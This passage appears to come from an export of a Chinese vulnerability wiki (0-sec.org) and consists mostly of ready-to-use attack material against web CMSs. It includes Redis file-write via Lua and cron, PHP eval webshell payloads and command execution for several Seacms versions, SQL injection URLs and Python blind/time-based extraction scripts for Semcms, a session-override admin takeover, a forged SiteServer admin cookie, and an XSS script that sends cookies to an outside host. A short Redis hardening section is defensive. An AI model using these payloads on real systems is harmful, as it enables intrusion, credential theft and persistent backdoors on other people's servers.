'dir:'..dir[2] rst[3] = 'dbfilename:'..dbfilename[2] rst[4] = 'rdbcompression:'..rdbcompress[2] return rst 保存以上代码为a.lua，变量data保存的是程序的16进制编码，执行 redis-cli --eval a.lua -h *.*.*.* 由于redis不支持在lua中调用save因此需要手动执行save操作,并且删除key data，恢复dir等。 redis-cli save -h *.*.*.* redis-cli config set dir *** -h *.*.*.* redis-cli config set dbfilename *** -h *.*.*.* redis-cli config set rdbcompression * -h *.*.*.* 目前写入的文件前后是存在垃圾数据的，下一步通过写计划任务调用python或者系统命令提取出二进制文件（写文件之在数据前后加入了 |||作为提取最终文件的标识）。 */1 * * * * python -c 'open(\"/tmp/rst\",\"a+\").write(open(\"/tmp/t\").read().split(\"|||\")[1])' /tmp/rst为最终上传的文件。 (5).傻瓜式python脚本 From:https://raw.githubusercontent.com/00theway/redis_exp/master/redis_exp.py 执行命令 需要root权限，每次添加计划任务前先获取服务器时间，然后根据获取的时间设置执行计划任务的时间，确保命令被执行一次，避免多次执行引发服务器异常。 python redis_exp.py --host *.*.*.* -c 'id' 上传文件 上传携带脏数据的文件不需要root权限，上传二进制文件需要root权限，先上传带有脏数据的文件，在文件前后插入特征字符串，然后添加计划任务截取数据 python redis_exp.py --host *.*.*.* -l /data/payload.py -r /tmp/p.py 暴力猜解目录 不需要root权限，利用 config set dir 'xx' 报错进行目录猜解 python redis_exp.py --host *.*.*.* -f p.txt 可以通过-p参数更改默认端口，-t参数更改等待时间 (6).批量验证 From:https://github.com/Ridter/hackredis 3.防护措施 1.禁止一些高危命令 修改 redis.conf 文件，添加以下内容，来禁用远程修改 DB 文件地址 rename-command FLUSHALL \"\" rename-command CONFIG \"\" rename-command EVAL \"\" 2.以低权限运行 Redis 服务 为 Redis 服务创建单独的用户和家目录，并且配置禁止登陆 $ groupadd -r redis && useradd -r -g redis redis 3.为 Redis 添加密码验证 修改 redis.conf 文件，添加 requirepass mypassword 4.禁止外网访问 Redis 修改 redis.conf 文件，添加或修改，使得 Redis 服务只在当前主机可用 bind 127.0.0.1 5.保证 authorized_keys 文件的安全 为了保证安全，您应该阻止其他用户添加新的公钥。 将 authorized_keys 的权限设置为对拥有者只读，其他用户没有任何权限： ## chmod 400 ~/.ssh/authorized_keys 为保证 authorized_keys 的权限不会被改掉，您还需要设置该文件的 immutable 位权限： ## chattr +i ~/.ssh/authorized_keys 然而，用户还可以重命名 ~/.ssh，然后新建新的 ~/.ssh 目录和 authorized_keys 文件。要避免这种情况，需要设置 ~./ssh 的 immutable 位权限： ## chattr +i ~/.ssh 注意: 如果需要添加新的公钥，需要移除 authorized_keys 的 immutable 位权限。然后，添加好新的公钥之后，按照上述步骤重新加上 immutable 位权限。 6.修改默认端口 指定Redis监听端口，默认端口为6379，作者在自己的一篇博文中解释了为什么选用6379作为默认端口，因为6379在手机按键上MERZ对应的号码，而MERZ取自意大利歌女Alessia Merz的名字 ## redis-server --port 6380 7.防火墙 // accept ## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT ## iptables -A INPUT -p udp -s 127.0.0.1 --dport 6379 -j ACCEPT // drop ## iptables -I INPUT -p tcp --dport 6379 -j DROP ## iptables -I INPUT -p udp --dport 6379 -j DROP // 保存规则并重启 iptables ## service iptables save ## service iptables restart 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-06 10:35:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/1.html":{"url":"0day/Seacms/1.html","title":"Seacms储存型xss","keywords":"","body":"Seacms 储存型xss 一、漏洞简介 二、漏洞影响 三、复现过程 POST /member.php?action=chgpwdsubmit oldpwd=test&newpwd=test&newpwd2=test&email=test%40test.com&nickname=&gaimi=%E7%A1%AE%E8%AE%A4%E4%BF%AE%E6%94%B9 src的值为http://127.0.0.1/test.js的短链接 当后台浏览到后台界面时，会触发漏洞，反弹回来Cookie，但需要注意两点，第一，只有系统管理员才能看到用户界面，普通管理员是没有这个权限的。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-22 14:21:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/2.html":{"url":"0day/Seacms/2.html","title":"Seacms getshell","keywords":"","body":"seacms getshell 一、漏洞简介 海洋cms是一款简单的php内容管理系统，主要用于视频网站，采用PHP+MYSQL架构，未使用框架 二、漏洞影响 三、复现过程 后台代码如下 \"; fwrite($open,$str); fclose($open); ShowMsg(\"成功保存设置!\",\"admin_ip.php\"); exit; } ?> 这里根本没有经过过滤，直接将变量写进去，可以写一个脚本利用 代码如下 # test.js var img = new Image(); img.src= \"http://127.0.0.1/test.php?x=\" + document.cookie + \"&p=\" + location.pathname; # test.php 这两个脚本会将cookie和后台路径保存在文件中，并且会向后台发送数据，添加一个系统管理员，同时会在系统中写入一个一句话木马，需要注意的是修改域名为测试域名。测试如下 代码已经写进了后 管理员添加成功 一句话也写进去了 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-22 14:30:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/海洋CMS V6.28.html":{"url":"0day/Seacms/海洋CMS V6.28.html","title":"Seacms V6.28","keywords":"","body":"海洋CMS V6.28 命令执行 一、漏洞简介 二、漏洞影响 三、复现过程 一句话payload，密码cmd: http://0-sec.org/search.php?searchtype=5&tid=&area=eval($_POST[cmd]) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-27 22:33:38 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/海洋CMS V6.45.html":{"url":"0day/Seacms/海洋CMS V6.45.html","title":"Seacms V6.45","keywords":"","body":"海洋CMS V6.45 前台getshell 一、漏洞简介 二、漏洞影响 三、复现过程 http://0-sec.org/search.php?searchtype=5 POST searchtype=5&order=}{end if} {if:1)phpinfo();if(1}{end if} searchtype=5&searchword=d&order=}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=phpinfo(); 一句话payload，文件test.php 密码pass: path: http://0-sec.org/search.php }{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&func=assert&cmd=fwrite(fopen(\"test.php\",\"w\"),'') 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-27 22:37:47 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/海洋CMS V6.54.html":{"url":"0day/Seacms/海洋CMS V6.54.html","title":"Seacms V6.54","keywords":"","body":"海洋CMS V6.54 命令执行 一、漏洞简介 二、漏洞影响 三、复现过程 path: http://0-sec.org/search.php POST: searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=ph&9[]=pinfo(); 命令执行payload path: http://0-sec.org/search.php POST: searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=sy&9[]=stem(\"whoami\"); 权限足够的话，file_put_concents(“connect.php”,”“)，然后连接菜刀即可 权限不足的话，利用payload构造url： http://0-sec.org/search.php?searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9])) 连接放入菜刀，密码是 9[] 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-27 22:41:43 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/海洋CMS V6.55.html":{"url":"0day/Seacms/海洋CMS V6.55.html","title":"Seacms V6.55","keywords":"","body":"海洋CMS V6.55 命令执行 一、漏洞简介 二、漏洞影响 三、复现过程 path: http://0-sec.org/search.php POST: searchtype=5&searchword={if{searchpage:year}&year=:as{searchpage:area}}&area=s{searchpage:letter}&letter=ert{searchpage:lang}&yuyan=($_SE{searchpage:jq}&jq=RVER{searchpage:ver}&&ver=[QUERY_STRING]));/* 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-27 22:43:42 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/Seacms V91 版本SQL注入.html":{"url":"0day/Seacms/Seacms V91 版本SQL注入.html","title":"Seacms V9.1 版本SQL注入","keywords":"","body":"Seacms V9.1 版本SQL注入 一、漏洞简介 二、漏洞影响 三、复现过程 获取管理员表中第一个用户的密码 http://0-sec.org/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(password)from%20sea_admin))),@`%27` 获取管理员表中第一个用户的账号 http://0-sec.org/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20(name)from%20sea_admin))),@`%27` 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-11 14:02:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/Seacms 9.92前台Getshell.html":{"url":"0day/Seacms/Seacms 9.92前台Getshell.html","title":"Seacms <= 9.92 前台Getshell","keywords":"","body":"Seacms 一、漏洞简介 二、漏洞影响 三、复现过程 http://0-sec.org/comment/api/index.php?gid=1&page=2&rlist[]=*hex/@eval($_GET[_]);?%3E 然后访问： http://0-sec.org/data/mysqli_error_trace.php?_=phpinfo(); 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-11 14:01:03 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Seacms/Seacms9.92.html":{"url":"0day/Seacms/Seacms9.92.html","title":"Seacms V9.92 越权+Getshell","keywords":"","body":"Seacms V9.92 越权+Getshell 一、漏洞简介 二、漏洞影响 三、复现过程 越权 1、首先注册一个普通用户 2、burp抓包改包，下面是发送payload POST /login.php HTTP/1.1 Host: 0-sec.org Content-Length: 49 Cache-Control: max-age=0 Origin: http://192.168.8.143 Upgrade-Insecure-Requests: 1 DNT: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Referer: http://192.168.8.143/login.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: PHPSESSID=9smu8an6nvbrqasp5m0o4bmts7 Connection: close dopost=login&userid=test&pwd=123456&validate=djyf&_SESSION[sea_admin_id]=1&_SESSION[sea_ckstr]=djyf 3、 登陆后台页面，可以发现管理员账户变成-1了,也同时拥有管理员的权限 getshell /admin/ip.php if($action==\"set\") { $v= $_POST['v']; $ip = $_POST['ip']; $open=fopen(\"../data/admin/ip.php\",\"w\" ); $str='\"; fwrite($open,$str); fclose($open); ShowMsg(\"成功保存设置!\",\"admin_ip.php\"); exit; 我们再去看一下ip.php格式 我们可以构造一下,然后保存 *;phpinfo();// \";@eval($_POST[pp]);// 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-11 14:18:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Semcms/Semcms v2.7.html":{"url":"0day/Semcms/Semcms v2.7.html","title":"Semcms v2.7 sql注入漏洞","keywords":"","body":"Semcms v2.7 sql注入漏洞 一、漏洞简介 二、漏洞影响 Semcms v2.7 三、复现过程 http://0-sec.org/semcms/sbifr_Admin/SEMCMS_Banner.php?err=001&lgid=1 and if(length(database()>0),sleep(10),1) --+ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-29 23:51:07 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Semcms/Semcms v2.7 密码找回漏洞.html":{"url":"0day/Semcms/Semcms v2.7 密码找回漏洞.html","title":"Semcms v2.7 密码找回漏洞","keywords":"","body":"Semcms v2.7 密码找回漏洞 一、漏洞简介 二、漏洞影响 SemCMS v2.7 三、复现过程 先在本地搭建好环境。 访问后台登录页面如下： 先来看看正常的找回密码的过程。 首先，查看 tfmp_Admin/index.html 的源码： 从代码可以看到，当点击登录按钮旁边的链接“如果忘记账号与密码，试试找回？”，时，会执行 js的views() 函数，该函数是弹出一个对话框并向SEMCMS_Remail.php?type=find 发送请求，让用户填写要接收重置后密码的邮箱地址，如下： 可以看到，就是构造上面那个要求输入E-mail的表单，点击“确认找回”按钮，该表单会提交到 ../Include/web_email.php?type=findpassword ，再看一下 web_email.php 中 type=findpassword 时的代码： 代码会根据用户输入的E-mail地址，查找 sc_user 表，看是否存在使用该E-mail地址的用户，如果存在，则随机生成4位数的认证码，并将其拼接到一个密码重置链接中，最后以邮件的形式发送给用户。用户点击邮件中的密码重置链接即可；但如果不存在，则弹出对话框，提示“此邮箱不存在！”，如图： 这里假设知道了管理员的邮箱，由于认证码是随机的4位数，这里很容易想到暴力破解。但通过 ../Include/web_email.php?type=findpassword 无法进行暴力破解，因为如上面代码所示，每次进入 if ($Type == 'findpassword') 语句块，认证码会重新生成。所以只能看看有没有别的地方可以利用。 回头再查看 index.html 的代码： 当请求参数 type=ok 时，SEMCMS_Remail.php后面跟的参数type也是ok，而前面提到，这种情况下，SEMCMS_Remail.php会构造另外一个表单，如下： 点击“确认找回”按钮，会提交到 ../Include/web_email.php?type=findok ，web_email.php 相应部分的代码如下： 可以看到，密码会经过md5加密后再存入数据库中。 因此，这里可以通过 http://0-sec.org/semcms_php_v2.7/tfmp_Admin/index.html?type=ok&umail=41864438@qq.com 弹出的表单，提交表单，使用BurpSuite进行暴力破解从而将密码重置。 为了本地测试方便，所以将初始密码设置为 111111，其md5的值为：96e79218965eb72c92a549dd5a330112。重置后密码将变为123456，MD5加密后即 e10adc3949ba59abbe56e057f20f883e 先用Python生成一个四位数字的字典： 利用BurpSuite 进行暴力破解： 结束后，查看数据库，发现密码确实被重置了： 使用 Admin/123456 可以成功登陆后台管理页面： 另外，这里涉及到表单提交，所以过程中我也想到过能否使用sql注入，然而每一次表单的提交，php代码中都在sql语句构造前，对用户的表单输入通过 test_input() 函数进行了安全检查和过滤，所以不存在SQL注入的问题。 参考链接 https://www.jianshu.com/p/4776cec565c1 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-29 23:47:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Semcms/Semcms v3.5.html":{"url":"0day/Semcms/Semcms v3.5.html","title":"Semcms v3.5 sql注入漏洞","keywords":"","body":"Semcms v3.5 sql注入漏洞 一、漏洞简介 二、漏洞影响 Semcms v3.5 三、复现过程 漏洞分析 在分析过程中看到网上已经有人发现semcms V2.4存在过滤不严导致sql注入的漏洞，不知道咋还没改，而且最新版过滤的关键字更少了。 首先查看首页文件index.php的代码 1 1 //网站logo 2 3 $weblogo=$web_url_meate.str_replace('../','',$row['web_logo']); 4 5 // 控制文字标签 更改 获取的 语种 id 6 7 if (isset($_GET[\"languageIDD\"])){$Language=test_input(verify_str($_GET[\"languageIDD\"]));}else{$Language=verify_str($Language);} 8 9 if(!empty($Language)){ 10 11 //网站SEO设定 12 13 $query=$db_conn->query(\"select * from sc_tagandseo where languageID=$Language\"); 14 $row=mysqli_fetch_array($query); 15 $tag_indexmetatit=datato($row['tag_indexmetatit']);// 首页标题 1 // 防sql入注 2 3 if (isset($_GET)){$GetArray=$_GET;}else{$GetArray='';} 　　　　//所有GET方式提交的变量都进行防注入检查 4 5 foreach ($GetArray as $value){ //get 6 7 verify_str($value); 8 9 } 10 11 function inject_check_sql($sql_str) { 12 13 return preg_match('/select|insert|=|%| 1 function test_input($data) { 　　　　　　　　　　　　　　　　　　//防止XSS 2 $data = str_replace(\"\", \"\", $data); 4 $data = str_replace(\"%\", \"percent\", $data); 5 $data = trim($data); 6 $data = stripslashes($data); 7 $data = htmlspecialchars($data,ENT_QUOTES);　　　　//实体编码 8 return $data; 9 10 } 　　可以看到第16行的函数verify_str()调用inject_check_sql()用来过滤危险字符，函数test_input用来过滤xss。其中可以明显地看到第11行的函数inject_check_sql()采用白名单的方式是有缺陷的，我们可以用布尔盲注来绕过 漏洞复现 http://0-sec.org/SEMCMS_PHP_3.5/index.php?languageIDD=1 and strcmp(left(user(),1), 0x72) rlike 0　　　　显示正常 http://0-sec.org/SEMCMS_PHP_3.5/index.php?languageIDD=1 and strcmp(left(user(),1), 0x73) rlike 0　　　　显示错误 参考网上已有的fuzz盲注脚本改了下，代码如下 #用python3版本 import requests url = \"http://172.19.77.44/SEMCMS_PHP_3.5/index.php?languageIDD=1\" print(\"Testing url: \" + url) #十进制数33-126间的ascii hex值 payload = [\"0x21\",\"0x22\",\"0x23\",\"0x24\",\"0x25\",\"0x26\",\"0x27\",\"0x28\",\"0x29\",\"0x2a\", \"0x2b\",\"0x2c\",\"0x2d\",\"0x2e\",\"0x2f\",\"0x30\",\"0x31\",\"0x32\",\"0x33\",\"0x34\", \"0x35\",\"0x36\",\"0x37\",\"0x38\",\"0x39\",\"0x3a\",\"0x3b\",\"0x3c\",\"0x3d\",\"0x3e\", \"0x3f\",\"0x40\",\"0x41\",\"0x42\",\"0x43\",\"0x44\",\"0x45\",\"0x46\",\"0x47\",\"0x48\", \"0x49\",\"0x4a\",\"0x4b\",\"0x4c\",\"0x4d\",\"0x4e\",\"0x4f\",\"0x50\",\"0x51\",\"0x52\", \"0x53\",\"0x54\",\"0x55\",\"0x56\",\"0x57\",\"0x58\",\"0x59\",\"0x5a\",\"0x5b\",\"0x5c\", \"0x5d\",\"0x5e\",\"0x5f\",\"0x60\",\"0x61\",\"0x62\",\"0x63\",\"0x64\",\"0x65\",\"0x66\", \"0x67\",\"0x68\",\"0x69\",\"0x6a\",\"0x6b\",\"0x6c\",\"0x6d\",\"0x6e\",\"0x6f\",\"0x70\", \"0x71\",\"0x72\",\"0x73\",\"0x74\",\"0x75\",\"0x76\",\"0x77\",\"0x78\",\"0x79\",\"0x7a\", \"0x7b\",\"0x7c\",\"0x7d\" ] user = \"\" for b in range(len(payload)): for a in payload: #sql_payload_user = \" and strcmp(substr(database(),%s,1), 0x%s) rlike 0\" % (b+1, a.replace(\"0x\",\"\")) #当前数据库名称 sql_payload_user = \" and strcmp(substr(user(),%s,1), 0x%s) rlike 0\" % (b+1, a.replace(\"0x\",\"\")) #当前数据库用户名 res = requests.get(url + sql_payload_user).text res1 = requests.get(url).text if len(res) == len(res1): #如果返回的内容长度大小一样，则表示匹配成功 user = user + a print(\" \") print(\"[*]info : 0x\" + user.replace(\"0x\",\"\").upper()) break else: print('\\r',\"Match failed,Next.....\",end='') 测试结果如下图 解码ascii hex值0x726F6F74406C6F63616C686F7374为root@localhost。当然因为过滤了select，获取表名就有点困难了，t00ls中看到有人介绍用selselectect来绕过的方式跟这个CMS的过滤方式是不一样的，所以行不通。暂时想到的办法是可以找一与验证密码有关的注点，因为这个注点包含表名，所以可以通过fuzz猜测其字段名，最后通过字段名取得字段值，可以看下这篇文章blind-sql-injection-burpsuite-like-a-boss(要翻墙) 参考链接 https://www.cnblogs.com/st404/p/10087191.html 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-30 00:02:25 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Semcms/Semcms v3.8.html":{"url":"0day/Semcms/Semcms v3.8.html","title":"Semcms v3.8 sql注入漏洞","keywords":"","body":"Semcms v3.8 sql注入漏洞 一、漏洞简介 二、漏洞影响 Semcms v3.8 三、复现过程 URL: http://0-sec.org/123/sOWj5B_Admin/SEMCMS_Inquiry.php Debug：Defense module is class.phpmailer.php and function inject_check_sqlBut VID[] didn't handle it POST POST /123/sOWj5B_Admin/SEMCMS_Inquiry.php?Class=Deleted&CF=Inquriy&page= HTTP/1.1 Host: 0-sec.org Content-Length: 24 Cache-Control: max-age=0 Origin: http://127.0.0.1 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8 Referer: http://127.0.0.1/123/sOWj5B_Admin/SEMCMS_Inquiry.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: MEIQIA_EXTRA_TRACK_ID=1F7WZdk3rwHIzKqUfkrNaZ9t1EE; _ga=GA1.1.1842664860.1547715044; UM_distinctid=169c55686280-0636c606d502d3-36664c08-1fa400-169c556862b2e4; CNZZDATA1256162028=1606185978-1553793969-%7C1553793969; CNZZDATA1707573=cnzz_eid%3D987595238-1554794879-http%253A%252F%252F127.0.0.1%252F%26ntime%3D1554913098; PHPSESSID=n75nrqp26757vguhhgd4mlptd4; __51cke__=; __tins__4329483=%7B%22sid%22%3A%201556088941568%2C%20%22vd%22%3A%203%2C%20%22expires%22%3A%201556090843766%7D; __51laig__=3; scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b Connection: close languageID=&AID%5B%5D=3 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-29 23:47:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Semcms/111.html":{"url":"0day/Semcms/111.html","title":"Semcms PHP(多语)版 V3.9 sql注入漏洞","keywords":"","body":"Semcms PHP(多语)版 V3.9 sql注入漏洞 一、漏洞简介 二、漏洞影响 Semcms PHP(多语)版 V3.9 三、复现过程 漏洞详情 漏洞文件为Include下的web_inc.php文件 包 POST /Include/web_inc.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: keep-alive Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b Upgrade-Insecure-Requests: 1 Content-Length: 64 Content-Type: application/x-www-form-urlencoded languageID=0 or if(substr(database(),1,1) like 0x6D,sleep(5),1); 基于时间的注入 代码审计 查看web_inc.php的关键代码 if (isset($_POST[\"languageID\"])){$Language=test_input(verify_str($_POST[\"languageID\"]));}else{$Language=verify_str($Language);} if(!empty($Language)){ //网站SEO设定 $query=$db_conn->query(\"select * from sc_tagandseo where languageID=$Language\"); $row=mysqli_fetch_array($query); $tag_indexmetatit=datato($row['tag_indexmetatit']);// 首页标题 $tag_indexkey=datato($row['tag_indexkey']);// 首页关键词 $tag_indexdes=datato($row['tag_indexdes']);// 首页描述 ...... 可以看到查询语句没有利用单引号闭合 跟入过滤函数查看 function test_input($data) { $data = str_replace(\"%\", \"percent\", $data); $data = trim($data); $data = stripslashes($data); $data = htmlspecialchars($data,ENT_QUOTES); return $data; } function inject_check_sql($sql_str) { return preg_match('/select|insert|=|%|过滤了一些关键字，正常的联合注入是没有办法了，可以时间盲注 利用if和sleep构造payload，因为,=被过滤且存在htmlspecialchars函数，利用like代替 languageID=0 or if(substr(database(),1,1) like 0x6e,sleep(5),1); 附上脚本 # !/usr/bin/python3 # -*- coding:utf-8 -*- # author: Forthrglory import requests def getDatabase(url): s = '' r = requests.session() head = {'Content-Type':'application/x-www-form-urlencoded'} for i in range(1,9): for j in range(97,122): data = 'languageID=0 or if(substr(database(),%s,1) like %s,sleep(5),1);' % (i,hex(j)) result = r.post(url, data, headers=head) if(result.elapsed.total_seconds() > 5): s = s + chr(j) print(s) break print('database=' + s) def getUser(url): s = '' r = requests.session() head = {'Content-Type':'application/x-www-form-urlencoded'} for i in range(1,21): for j in range(64,90): data = 'languageID=0 or if(substr(user(),%s,1) like %s,sleep(5),1);' % (i,hex(j)) result = r.post(url, data, headers=head) if(result.elapsed.total_seconds() > 5): s = s + chr(j).lower() print(s) break print('user=' + s) if __name__ == '__main__': url = 'http://127.0.0.1/Include/web_inc.php' s = getDatabase(url) u = getUser(url) 运行截图 不过因为过滤了select，暂时不知道怎么注出数据ORZ，比如说注出user表中的密码之类的，如果有师傅愿意不吝赐教，这里万分感谢 参考链接 https://xz.aliyun.com/t/7122 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-29 20:59:05 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ShopXO/1.html":{"url":"0day/ShopXO/1.html","title":"ShopXO v1.8.0 后台getshell","keywords":"","body":"ShopXO v1.8.0 后台getshell 一、漏洞简介 二、漏洞影响 ShopXO 小于v1.8.0 三、复现过程 默认后台密码 admin shopxo 登入后台-》应用中心-》应用商店-》主题 随便下载一个主题 然后把下载下来的压缩包解压出来 把shell放入static目录 回到网站后台 网站管理-》主题管理-》安装主题 shell地址 http://www.0-sec.org/static/index/default/shell.php public是运行目录！！！ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-10 23:45:12 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/SiteServer/SiteServer CMS 5.0 管理后台Cookie欺骗.html":{"url":"0day/SiteServer/SiteServer CMS 5.0 管理后台Cookie欺骗.html","title":"SiteServer CMS 5.0 管理后台Cookie欺骗","keywords":"","body":"SiteServer CMS 5.0 管理后台Cookie欺骗 一、漏洞简介 SiteServer CMS 5.0 后台访问控制采用JWT技术进行身份鉴别，HTTP请求时通过Cookie中的ss_administrator_access_token字段值作为身份鉴别，而加密ss_administrator_access_token字段值的key在安装时未进行随机初始化，导致所有相同版本的应用系统Cookie可以通用,通过修改Cookie可登陆任意相同版本后台。 二、漏洞影响 SiteServer CMS 5.0 三、复现过程 系统环境：IIS 7.5 + MSSQL 2008 R2 （操作系统：Windows Server 2008 R2） 先访问一个站点，以官方体验站点为例子： http://cms.demo.siteserver.cn/siteserver/login.aspx Chrome浏览器按F12切换到控制台，设置ss_administrator_access_token的Cookie值（以下PoC可以直接使用）： document.cookie='ss_administrator_access_token=M3ENIa3NKJJ39JCRHnY4PgfJqMC7lFjggL0e9S06Bs9ubZE90add0xM2aesaL0add0Cxo8Xe5VZrSanerzFU8oZaMXCC9AoJfZvq5AtBXGxi0slash0tCRtk8UgV5UXu1u2pDL6htbwIqGBZx0slash0ZqVH4x0LjRE20slash0mz3FHc5QJFpTAKI0slash0AJ52LJ6XnWB7gsJuHFauL0add0q0add0sIMft8e3ef840gWzQaChpfGHfYwGS5wHFaC19T56X2J0Z5Hn500equals0' 再次访问（后面没有login.aspx）： http://cms.demo.siteserver.cn/siteserver/ 登陆成功 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-11 14:04:43 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Smarty/1.html":{"url":"0day/Smarty/1.html","title":"（CVE-2017-1000480）Smarty<=3.1.31 命令执行RCE","keywords":"","body":"（CVE-2017-1000480）Smarty 一、漏洞简介 在不清理模板名称的自定义资源上调用fetch（）或display（）函数时，3.1.32之前的Smarty 3容易受到PHP代码注入的攻击。 二、漏洞影响 Smarty 三、复现过程 1、搭建环境 测试环境为： PHP5.6.40+Apache2+Smarty3.1.31+Debian9 ➜ html mkdir smarty ➜ html cd smarty ➜ smarty mkdir cache compile templates ➜ smarty composer require smarty/smarty -v ➜ smarty sed -i -e 's/\\^3.1/3.1.31/g' composer.json ➜ smarty composer update ➜ smarty sudo chmod -R 777 . /var/www/html/smarty/index.php 如下： setCacheDir('cache'); $smarty->setCompileDir('compile'); $smarty->setTemplateDir('templates'); $my_security_policy = new Smarty_Security($smarty); $smarty->enableSecurity($my_security_policy); $smarty->registerResource('username', new Smarty_Resource_Widget()); $smarty->display('username:'.$_GET['mochazz']); ?> 2、漏洞分析 具体攻击 payload 如下： http://0-sec.org/index.php?mochazz=*/phpinfo();/* 我们直接从 display 方法开始跟进，会发现其最终会调用 render 方法。在 render 